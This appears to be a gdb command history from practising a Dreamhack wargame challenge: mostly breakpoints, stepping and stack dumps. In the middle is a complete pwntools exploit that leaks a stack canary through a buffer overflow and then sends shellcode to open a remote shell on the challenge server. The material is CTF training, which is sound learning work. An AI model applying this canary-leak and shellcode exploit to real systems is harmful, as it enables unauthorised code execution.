disassemble main
b *main+37
r
ni
c
r
si
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
quit
info functions
disassemble main
b *main+37
r
ni
x/34wx $esp
x/36wx $esp
x/34wx $ebp-0x80
x/36wx $ebp-0x80
ni
c
r
quit
entry main
info functiona
info functions
quit
info functions
quit
r
entry main
quit
entry
quit
b *main+37
r
ni
x/34wx $ebp-0x80
disassemble _start
x /1i 0x8048440
x /1s 0x8048440
x/1a 0x8048440
x/1i 0x80498fc
x/1wx 0x80498fc
b *main+28
r
quit
b *_start+28
r
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
quit
b *main+37
r
ni
pwn import *
context.arch='amd64' #server architecture
context.log_level='debug' #set debug mode
# server connection
p=remote("host3.dreamhack.games",21919)
# get the address of buf
p.recvuntil(b"Address of the buf: ")
bufAddr=int(p.recv(14),16)
# get the canary value using stack buffer overflow
p.recvuntil(b"Input: ")
payload=b'a'*0x59 # 0x59 = 0x58(buf size) + 0x1(canary's first byte(NULL)), to avoid meet null byte(can't read canary)
p.send(payload)
p.recvuntil(payload)
canary=u64(b'\x00'+p.recvn(7)) # canary
#shell code with canary to cause stack buffer overflow
sh = asm(shellcraft.sh())
payload = sh.ljust(0x58, b'A') + p64(canary) + b'B'*0x8 + p64(bufAddr)
p.recvuntil(b"Input: ")
p.sendline(payload)
p.interactive()
quit
b *main+37
r
ni
x /34wx $ebp-0x80
r
quit
b *main
r
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
x /1i Oxf7debed5
x /s Oxf7debed5
x /1i 0xf7debed5
quit
entry
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
si
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni'
ni
no
ni
ni
ni
ni
ni
ni
ni
finish
finish
finish
ni
ni
ni
ni
ni
ni
ni
ni
ni
in
ni
ni
ni
ni
ni
quit
info functions
b *__libc_start_main
r
b *__libc_start_main+25
r
c
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
ni
si
b *main+37
c
ni
quit
